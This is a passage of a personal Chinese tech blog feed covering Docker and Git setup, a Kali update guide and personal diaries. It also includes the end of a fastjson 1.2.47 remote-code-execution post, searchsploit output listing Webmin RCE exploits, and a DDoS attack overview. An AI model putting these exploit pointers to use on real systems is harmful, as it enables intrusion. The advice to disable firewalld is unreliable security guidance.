/tmp/success</code>已成功执行：<br><a href="https://www.buhuixiu.com/images/serverside.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/serverside.png"></a></img></p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>fastjson 1.2.47 相关的修复，从应用端来说就是升级相关的版本到最新。。至于fastjson源代码是如何修复的，后面再补充。</p><h1 id="防御-阿里WAF"><a href="#防御-阿里WAF" class="headerlink" title="防御-阿里WAF"></a>防御-阿里WAF</h1><p>关于防御方面，阿里WAF的解释是通过相关POST参数过滤来实现。。我测试了下，直接就把@type类型的数据给拦截掉了。<br><a href="https://www.buhuixiu.com/images/阿里WAF2.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/阿里WAF2.png"></a></img><br><a href="https://www.buhuixiu.com/images/阿里waf1.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/阿里waf1.png"></a></img><br><a href="https://www.buhuixiu.com/images/waf3.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/waf3.png"></a></img></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Fastjson 相关安全漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fastjson vulnerable poc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker-compose</title>
      <link href="/2020/06/30/docker-compose/"/>
      <url>/2020/06/30/docker-compose/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="https://engineering.opensooq.com/wp-content/uploads/2017/12/On-the-fly-ad-hoc-docker-compose-development-stack1.jpg" class="gallery-item"><img src="https://engineering.opensooq.com/wp-content/uploads/2017/12/On-the-fly-ad-hoc-docker-compose-development-stack1.jpg"></a></img></p><h2 id="Docker-Compose-Compose-简介"><a href="#Docker-Compose-Compose-简介" class="headerlink" title="Docker Compose Compose 简介"></a>Docker Compose Compose 简介</h2><p>Compose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，您可以使用 YML 文件来配置应用程序需要的所有服务。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。<br>如果你还不了解 YML 文件配置，可以先阅读 YAML 入门教程。##<br>Compose 使用的三个步骤：<br>• 使用 Dockerfile 定义应用程序的环境。<br>• 使用 docker-compose.yml 定义构成应用程序的服务，这样它们可以在隔离环境中一起运行。<br>最后，执行 docker-compose up 命令来启动并运行整个应用程序。</p><h2 id="Installing-docker-compose"><a href="#Installing-docker-compose" class="headerlink" title="Installing docker-compose"></a>Installing docker-compose</h2><h3 id="Global-installation"><a href="#Global-installation" class="headerlink" title="Global installation"></a>Global installation</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">curl -L <span class="hljs-string">&quot;https://github.com/docker/compose/releases/download/1.23.2/docker-compose-$(uname -s)-$(uname -m)&quot;</span> -o docker-compose<br></code></pre></td></tr></table></figure><p>Once the binary is downloaded, we move it into /usr/local/bin and we make it executable:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sudo mv docker-compose /usr/local/<span class="hljs-built_in">bin</span> &amp;&amp; sudo chmod +x /usr/local/<span class="hljs-built_in">bin</span>/docker-compose<br></code></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker安装（利用官网得一键脚本)</title>
      <link href="/2020/06/30/docker%E5%AE%89%E8%A3%85%EF%BC%88%E5%88%A9%E7%94%A8%E5%AE%98%E7%BD%91%E5%BE%97%E4%B8%80%E9%94%AE%E8%84%9A%E6%9C%AC/"/>
      <url>/2020/06/30/docker%E5%AE%89%E8%A3%85%EF%BC%88%E5%88%A9%E7%94%A8%E5%AE%98%E7%BD%91%E5%BE%97%E4%B8%80%E9%94%AE%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="https://d33wubrfki0l68.cloudfront.net/e7a6759eb6232b4280b83b18aa255289d65e4b6e/7698a/images/logo.webp" class="gallery-item"><img src="https://d33wubrfki0l68.cloudfront.net/e7a6759eb6232b4280b83b18aa255289d65e4b6e/7698a/images/logo.webp"></a></src></p><h2 id="CentOS-Docker-安装"><a href="#CentOS-Docker-安装" class="headerlink" title="CentOS Docker 安装"></a>CentOS Docker 安装</h2><p>Docker 支持以下的 64 位 CentOS 版本：<br>• CentOS 7<br>• CentOS 8<br>更高版本…</p><h2 id="使用官方安装脚本自动安装"><a href="#使用官方安装脚本自动安装" class="headerlink" title="使用官方安装脚本自动安装"></a>使用官方安装脚本自动安装</h2><p>安装命令如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun    (这里利用阿里云的镜像）<br></code></pre></td></tr></table></figure><p>也可以使用国内 daocloud 一键安装命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">curl -sSL https://get.daocloud.io/docker | sh<br><br></code></pre></td></tr></table></figure><span id="more"></span><h4 id="安装过程中报错：缺少containerd-io-相关组件。"><a href="#安装过程中报错：缺少containerd-io-相关组件。" class="headerlink" title="安装过程中报错：缺少containerd.io 相关组件。"></a>安装过程中报错：缺少containerd.io 相关组件。</h4><p>Install the latest available containerd.io package manually<br>If we stricly need to install the latest version of docker-ce, we can install the required version of containerd.io manually, by running:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sudo dnf install https://download.docker.com/linux/centos/<span class="hljs-number">7</span>/x86_64/stable/Packages/containerd.io-<span class="hljs-number">1.2</span><span class="hljs-number">.6</span>-<span class="hljs-number">3.3</span>.el7.x86_64.rpm<br></code></pre></td></tr></table></figure><h2 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">sudo systemctl disable firewalld<br>sudo systemctl stop firewalld<br><br><br></code></pre></td></tr></table></figure><h2 id="将docker-注册成服务"><a href="#将docker-注册成服务" class="headerlink" title="将docker 注册成服务"></a>将docker 注册成服务</h2><p>Start and enable the docker daemon<br>Once docker-ce is installed, we must start and enable the docker daemon, so that it will be also launched automatically at boot. The command we need to run is the following:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sudo systemctl enable --now docker<br></code></pre></td></tr></table></figure><p>At this point, we can confirm that the daemon is active by running:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">systemctl <span class="hljs-keyword">is</span>-active docker<br></code></pre></td></tr></table></figure><p>active<br>Similarly, we can check that it is enabled at boot, by running:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">systemctl <span class="hljs-keyword">is</span>-enabled docker<br></code></pre></td></tr></table></figure><p>enabled</p><h2 id="相关参考"><a href="#相关参考" class="headerlink" title="相关参考"></a>相关参考</h2><p> <a href="https://linuxconfig.org/how-to-install-docker-in-rhel-8"  >    How to install Docker CE on RHEL 8 / CentOS 8</a><br><a href="https://www.runoob.com/docker/centos-docker-install.html"> 菜鸟论坛Centos Docker安装</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200630个人日记</title>
      <link href="/2020/06/30/20200630%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/"/>
      <url>/2020/06/30/20200630%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="https://miro.medium.com/max/1400/1*QqoS6WsjG6WSr9-BFFQhbA.jpeg" class="gallery-item"><img src="https://miro.medium.com/max/1400/1*QqoS6WsjG6WSr9-BFFQhbA.jpeg" ></a></img></p><h2 id="The-key-of-success-is-you-can-catch-opporunity"><a href="#The-key-of-success-is-you-can-catch-opporunity" class="headerlink" title="The key of success is you can catch opporunity."></a>The key of success is you can catch opporunity.</h2><p>almost of us don’t have the skill. 在中国的传统思想里面，自制，隐忍，勤奋，天资聪慧才是成功之道需要具备的能力。<br>但是，事实上两耳不闻窗外事，一心只读圣贤书，注定在这个社会是要失败的。现在社会的变化速度，信息量已经不是古时候的<br>光景。机会瞬息万变，无论是危机，和看起来是迈向成功的机会，（这两者之间在很大程度上，是有反转的机会的。）</p><p>事实上，能够看到机会，机遇，并且调整自己的“姿势”，以便迅速的获取利益，比自己的能力高低，修养提升如何更加的来得有用。<br>就拿2020年的这场新冠病毒来说，有人失业，有人却利用阿里巴巴外贸的监管缺口，迅速更改主业，变成销售口罩产品，在国内采购口罩，<br>转卖到急需口罩的国外，赚取中间的利润几百万。这里面就是“心态”“姿势”“经验”“机遇把握”等问题最终决定的。<br>这也印证了一句话，危机即机遇。</p><p>我们需要训练这种把握机遇的能力。至于如何训练，是我暂时没有想法的。但是，我想，基本的开拓视野，有全球化的眼光，是必须的一个条件之一。<br>就拿中国的房价来说，如果你从中国的整个市场来看，惊人的涨幅，让你觉得不可思议。但是，如果你看下日本，看下其他国家，在类似的历史<br>时期内也经历过相同的事情，那么你就可以预先的预估到类似的事情的发展曲线。虽然，没人能逃脱价值的本体，但是价格浮动空间却是价值的几何倍数。<br>想想，在中国一线城市的一套房子，可能就决定了你的一生是否能被世俗得定义为成功或者失败。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2020年6月23日随笔</title>
      <link href="/2020/06/23/20200623%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/06/23/20200623%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<a href="https://www.buhuixiu.com/images/school.png" class="gallery-item"><img src="https://www.buhuixiu.com/images/school.png" height=500 width = 300 align=middle></a></img><h1 id="学校的操场"><a href="#学校的操场" class="headerlink" title="学校的操场"></a>学校的操场</h1><h1 id="长满了草"><a href="#长满了草" class="headerlink" title="长满了草"></a>长满了草</h1><h1 id="像极"><a href="#像极" class="headerlink" title="像极"></a>像极</h1><h1 id="青春的坟头……"><a href="#青春的坟头……" class="headerlink" title="青春的坟头……"></a>青春的坟头……</h1><h1 id="回去看你一眼"><a href="#回去看你一眼" class="headerlink" title="回去看你一眼"></a>回去看你一眼</h1><h1 id="可能"><a href="#可能" class="headerlink" title="可能"></a>可能</h1><h1 id="当初的纠葛"><a href="#当初的纠葛" class="headerlink" title="当初的纠葛"></a>当初的纠葛</h1><h1 id="是爱恨，是不舍，是甜蜜"><a href="#是爱恨，是不舍，是甜蜜" class="headerlink" title="是爱恨，是不舍，是甜蜜?"></a>是爱恨，是不舍，是甜蜜?</h1><h1 id="感谢你"><a href="#感谢你" class="headerlink" title="感谢你"></a>感谢你</h1><h1 id="青春名片里最靓丽的那张照片"><a href="#青春名片里最靓丽的那张照片" class="headerlink" title="青春名片里最靓丽的那张照片"></a>青春名片里最靓丽的那张照片</h1><h1 id="最纯情想爱的样子"><a href="#最纯情想爱的样子" class="headerlink" title="最纯情想爱的样子"></a>最纯情想爱的样子</h1></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>what is a DDOS attack</title>
      <link href="/2020/06/05/%E4%BB%80%E4%B9%88%E6%98%AFDDOS%E6%94%BB%E5%87%BB/"/>
      <url>/2020/06/05/%E4%BB%80%E4%B9%88%E6%98%AFDDOS%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>  分布式拒绝服务（Distributed Denial of Service，简称DDoS）指借助于客户机/服务器模式，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。</p><p>通常，攻击者使用一个非法账号将DDoS主控程序安装在一台计算机上，并在网络上的许多计算机上安装了代理程序。在所设定的时间，主控程序将与大量代理程序进行通讯，代理程序收到指令时就发动攻击。利用客户机/服务器模式，主控程序能在几秒钟内激活成百上千次代理程序的运行。</p><p>常见的DDoS攻击类型包括畸形报文、传输层DDoS攻击、DNS DDoS攻击、连接型DDoS攻击、Web应用层DDoS攻击。关于每种类型的具体介绍，请参见下文说明。</p><h5 id="畸形报文"><a href="#畸形报文" class="headerlink" title="畸形报文"></a>畸形报文</h5><p>畸形报文攻击指通过向目标系统发送有缺陷的IP报文，使得目标系统在处理这样的报文时出现崩溃，从而达到拒绝服务的攻击目的。</p><p>畸形报文主要包括以下类型：Frag Flood、Smurf、Stream Flood、Land Flood、IP畸形报文、TCP畸形报文、UDP畸形报文。</p><h5 id="传输层DDoS攻击"><a href="#传输层DDoS攻击" class="headerlink" title="传输层DDoS攻击"></a>传输层DDoS攻击</h5><p>传输层DDoS攻击主要是指Syn Flood、Ack Flood、UDP Flood、ICMP Flood、RstFlood等攻击。</p><p>以Syn Flood攻击为例，它利用了TCP协议的三次握手机制，当服务端接收到一个Syn请求时，服务端必须使用一个监听队列将该连接保存一定时间。因此，通过向服务端不停发送Syn请求，但不响应Syn+Ack报文，从而消耗服务端的资源。当监听队列被占满时，服务端将无法响应正常用户的请求，达到拒绝服务攻击的目的。</p><h5 id="DNS-DDoS攻击"><a href="#DNS-DDoS攻击" class="headerlink" title="DNS DDoS攻击"></a>DNS DDoS攻击</h5><p>DNS DDoS攻击主要是指DNS Request Flood、DNS Response Flood、虚假源+真实源DNS Query Flood、权威服务器攻击和Local服务器攻击。</p><p>以DNS Query Flood攻击为例，其本质上执行的是真实的Query请求，属于正常业务行为。但如果多台傀儡机同时发起海量的域名查询请求，服务端无法响应正常的Query请求，从而导致拒绝服务。</p><h5 id="连接型DDoS攻击"><a href="#连接型DDoS攻击" class="headerlink" title="连接型DDoS攻击"></a>连接型DDoS攻击</h5><p>连接型DDoS攻击主要是指TCP慢速连接攻击、连接耗尽攻击、Loic、Hoic、Slowloris、 Pyloris、Xoic等慢速攻击。</p><p>以Slowloris攻击为例，其攻击目标是Web服务器的并发上限，当Web服务器的连接并发数达到上限后，Web服务即无法接受新的请求。具体来说，Web服务接收到新的HTTP请求时，建立新的连接来处理请求，并在处理完成后关闭这个连接；如果该连接一直处于连接状态，收到新的HTTP请求时则需要建立新的连接进行处理；而当所有连接都处于连接状态时，Web将无法处理任何新的请求。</p><p>Slowloris攻击利用HTTP协议的特性来达到攻击目的。HTTP请求以\r\n\r\n标识Headers的结束，如果Web服务端只收到\r\n，则认为HTTP Headers部分没有结束，将保留该连接并等待后续的请求内容。</p><h5 id="Web应用层DDoS攻击"><a href="#Web应用层DDoS攻击" class="headerlink" title="Web应用层DDoS攻击"></a>Web应用层DDoS攻击</h5><p>Web应用层攻击主要是指HTTP Get Flood、HTTP Post Flood、CC等攻击。</p><p>通常应用层攻击完全模拟用户请求，类似于各种搜索引擎和爬虫一样，这些攻击行为和正常的业务并没有严格的边界，难以辨别。</p><p>Web服务中一些资源消耗较大的事务和页面。例如，Web应用中的分页和分表，如果控制页面的参数过大，频繁的翻页将会占用较多的Web服务资源。尤其在高并发频繁调用的情况下，类似这样的事务就成了早期CC攻击的目标。</p><p>由于现在的攻击大都是混合型的，因此模拟用户行为的频繁操作都可以被认为是CC攻击。例如，各种刷票软件对网站的访问，从某种程度上来说就是CC攻击。</p><p>CC攻击瞄准的是Web应用的后端业务，除了导致拒绝服务外，还会直接影响Web应用的功能和性能，包括Web响应时间、数据库服务、磁盘读写等。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 非原创 </tag>
            
            <tag> 阿里云 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20200603个人日志记录</title>
      <link href="/2020/06/03/20200603%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/06/03/20200603%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h3 id="昨晚很晚才睡。"><a href="#昨晚很晚才睡。" class="headerlink" title="昨晚很晚才睡。"></a>昨晚很晚才睡。</h3><p>  　　老婆接近2点多才回来，还喝了酒。虽然是为了工作上的事情，也不想给她好脸色看。她一方面抱怨工作太累，压力太大，支撑太少，需求得不到满足。一方面又很投入。乐此不疲，热衷聚会，从不缺席。好几个以前的同事，都跟我说，莎姐不容易，处在一个尴尬的位置，每天受气。让我不要跟她争吵，好好体谅她。</p><p> 　　她处在这个位置也已经有4-5年了，改变得很少。无论是管理方式，还是自身的提升。依旧是劳动密集型管理，喜欢跟人聊天式的沟通，电话1-2个小时。当我跟她说这些的时候，她总是一副，你别以为你聪明的样子。</p><p>  　　 看以前老婆的照片，年轻时候的照片，确实很漂亮。是我非常喜欢的类型。<a href="20200603%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/psu.jfif" title="node更换路径" class="gallery-item"><img src="20200603%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/psu.jfif" alt="node更换路径"></a> 也许生活再重来一次，我依旧无法逃脱她的诱惑。虽然她对你的事业，对你的行为习惯，没有谈得上太多助益的地方。更多的时候，是将你带入一些与理想目标背道而驰的方向。比如说，晚睡熬夜；周末睡到9-10点起来；从不看书；早餐可吃可不吃；带着儿子看抖音；快吃饭了，还开包零食吃下。 但，无可否认，她的善良，她的勤劳，她的包容是那些自制，有明确奋斗目标的高级知识分子所无法企及的。很明显的一个感觉是，这10多年来，我感觉是被她塑造了。或许，是我意志不够坚定，或许是我不想忍受那份家庭割裂的寂寞和痛苦，或许…….幸运的是，现在还好，我们之间相处还算融洽，没有什么无法沟通的东西。不知道她是否有同样的感觉，大概率是没有的吧。有时候，跟她开玩笑说，她应该投胎做个男人，我也会问她，是否想做个男人。虽然表面上，她像个男人一样大大咧咧，但是关键时候，又很怕担当责任，希望我站出来，拿定主意。她给出的解释是，我老说她…..这的确是一个非常正当的理由。</p><p>　　儿子不是那种喜欢学习的人，不够认真。在课堂上的表现可以说是很差。。但是作为父母，随着年龄的增长。很多时候，必须扮演成一个演员。成为他的fans。能够主动去发现他的闪光点，能够赞赏他。。不要觉得他笨或者不理解他为啥不能将你说得这么直白的话吃透，人与人之间的沟通本就很难，何况还加了数学，物理，英语这些沟壑。。。还是希望他能够自强和独立。。我记得自己读浏阳师范的时候，还因为校服的白袖子脏得无以附加，而被老师请上了讲台，当众“展览”。虽然那位老师可能并非出于恶意，但是对我而言还是不好受的。从一个侧面可以反映出，我的生活自理能力在当时是挺差的，生活水准也是挺低的（穷）。经常会饿肚子。。这也怪不得家里，主要是自己用钱的方式不行。。有钱潇洒月初，无钱潦倒月尾。这点儿子倒是像极了我，很“大方”。待人热诚，喜欢把家里东西送人，好像资源很充裕的样子。读书那会，班上有比我生活更拮据的同学，但是却不像我一样会时不时得捉襟见肘。他们会把钱的用度安排得很合理。。比较奇怪的是，我这样一个屌丝类型的犀利哥。在中专快毕业的时候，竟然牵手成功了一个班上的学委妹子。看着毕业那会照的照片，我依旧是那个屌丝的样子。见不得半点讨喜的音容。。毕业后断断续续去见了那个妹子几次，人是对我越来越冷了，也就彻底断了念想。。连同学聚会也不想去了。。        </p><pre><code>                                                                           2020/06/03 随笔    </code></pre></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 个人日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人日记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何更新KALI_Linux</title>
      <link href="/2019/07/27/%E5%A6%82%E4%BD%95%E6%9B%B4%E6%96%B0KALI-Linux/"/>
      <url>/2019/07/27/%E5%A6%82%E4%BD%95%E6%9B%B4%E6%96%B0KALI-Linux/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="为什么需要更新kali-linux"><a href="#为什么需要更新kali-linux" class="headerlink" title="为什么需要更新kali-linux"></a>为什么需要更新kali-linux</h2><p>因为相应的cve 公布的漏洞及poc是不定期更新的，如果你不更新，无法获取相关的一些信息。<br>官方的建议就是每隔几周你需要更新下版本。<br>如果你需要使用新的版本工具，或者听到关于安全更新，但是无法搜索到，那么，你就必须要更行版本呢了。就像下面这个，如果一年不更新，那么相关的Remote code Execution 47293.sh是无法搜索到的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">root@kali:~# searchsploit webmin 1.920<br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                                                                                                                    |  Path<br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Webmin 1.920 - Remote Code Execution                                                                                                                                              | linux/webapps/47293.sh<br>Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                                                                                 | linux/remote/47230.rb<br>Webmin &lt; 1.920 - &#x27;rpc.cgi&#x27; Remote Code Execution (Metasploit)                                                                                                                     | linux/webapps/47330.rb<br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br></code></pre></td></tr></table></figure><p>kali_linux 是滚动发行版本，有两个更新源。1，testing 2,stable .对于相应的测试版本，可能存在破坏工具，使用工具不可用的情况。不建议更新。<br>如果使用最新的镜像，那么你不需要更新。</p><h2 id="如何更新"><a href="#如何更新" class="headerlink" title="如何更新"></a>如何更新</h2><p>确保 <font color="red">etc/apt/sources.list</font> 进行了合适的配置。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">kali@kali:~$ cat /etc/apt/sources.list<br>deb http://http.kali.org/kali kali-rolling main contrib non-free<br>deb-src http://http.kali.org/kali kali-rolling main contrib non-free<br></code></pre></td></tr></table></figure><p>然后运行如下的命令，从而更行到最新的Kali 版本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">kali@kali:~$ sudo apt update<br>kali@kali:~$<br>kali@kali:~$ sudo apt full-upgrade -y<br>kali@kali:~$<br></code></pre></td></tr></table></figure><h2 id="整个过程大概耗时30分钟……………没有使用代理和镜像站点的情况下。"><a href="#整个过程大概耗时30分钟……………没有使用代理和镜像站点的情况下。" class="headerlink" title="整个过程大概耗时30分钟……………没有使用代理和镜像站点的情况下。"></a>整个过程大概耗时30分钟……………没有使用代理和镜像站点的情况下。</h2></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> kali-linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0 Git服务器安装</title>
      <link href="/2017/08/18/0%E6%90%AD%E5%BB%BAGit%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2017/08/18/0%E6%90%AD%E5%BB%BAGit%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/00137583770360579bc4b458f044ce7afed3df579123eca000">原文</a></p><ul><li>  搭建Git服务器非常简单，通常10分钟即可完成；</li><li>  要方便管理公钥，用Gitosis；</li><li>  要像SVN那样变态地控制权限，用Gitolite。</li></ul><p>假设你已经有sudo权限的用户账号，下面，正式开始安装。</p><h5 id="第一步，安装git："><a href="#第一步，安装git：" class="headerlink" title="第一步，安装git："></a>第一步，安装git：</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo apt-<span class="hljs-builtin-name">get</span> install git<br><br></code></pre></td></tr></table></figure><span id="more"></span><h5 id="第二步，创建一个git用户，用来运行git服务："><a href="#第二步，创建一个git用户，用来运行git服务：" class="headerlink" title="第二步，创建一个git用户，用来运行git服务："></a>第二步，创建一个git用户，用来运行git服务：</h5><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sudo adduser git<br><br></code></pre></td></tr></table></figure><h5 id="第三步，创建证书登录："><a href="#第三步，创建证书登录：" class="headerlink" title="第三步，创建证书登录："></a>第三步，创建证书登录：</h5><p>收集所有需要登录的用户的公钥，就是他们自己的<code>id_rsa.pub</code>文件，把所有公钥导入到<code>/home/git/.ssh/authorized_keys</code>文件里，一行一个。</p><h5 id="第四步，初始化Git仓库："><a href="#第四步，初始化Git仓库：" class="headerlink" title="第四步，初始化Git仓库："></a>第四步，初始化Git仓库：</h5><p>先选定一个目录作为Git仓库，假定是<code>/srv/sample.git</code>，在<code>/srv</code>目录下输入命令：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">$ sudo git init <span class="hljs-comment">--bare sample.git</span><br><br></code></pre></td></tr></table></figure><p>Git就会创建一个裸仓库，裸仓库没有工作区，因为服务器上的Git仓库纯粹是为了共享，所以不让用户直接登录到服务器上去改工作区，并且服务器上的Git仓库通常都以<code>.git</code>结尾。然后，把owner改为<code>git</code>：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sudo chown -R <span class="hljs-symbol">git:</span>git sample.git<br><br></code></pre></td></tr></table></figure><h5 id="第五步，禁用shell登录："><a href="#第五步，禁用shell登录：" class="headerlink" title="第五步，禁用shell登录："></a>第五步，禁用shell登录：</h5><p>出于安全考虑，第二步创建的git用户不允许登录shell，这可以通过编辑/etc/passwd文件完成。找到类似下面的一行：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">git:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span 